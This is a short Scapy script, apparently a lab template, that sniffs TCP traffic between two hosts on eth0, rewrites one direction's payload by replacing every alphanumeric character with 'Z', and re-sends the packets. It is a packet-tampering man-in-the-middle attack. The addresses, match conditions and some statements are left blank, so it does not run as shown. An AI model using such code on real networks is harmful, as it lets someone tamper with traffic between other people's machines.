#!/usr/bin/env python3
from scapy.all import *

IP_A = ""
IP_B = ""
MAC_A = ""
MAC_B = ""

def spoof_pkt(pkt):
	if pkt[IP].src== and pkt[IP].dst==:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load
			newdata = re.sub(r'[0-9a-zA-Z]',r'Z', data.decode())
			send(newpkt/newdata)
		else:
			send(newpkt)
	
	elif pkt[IP].src== and pkt[IP].dst==:
		newpkt = IP(bytes(pkt[IP]))
		del()
		del()
		send(newpkt)

template = 'tcp and (ether src {A} or ether src {B})'
f = template.format(A=MAC_A, B=MAC_B)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
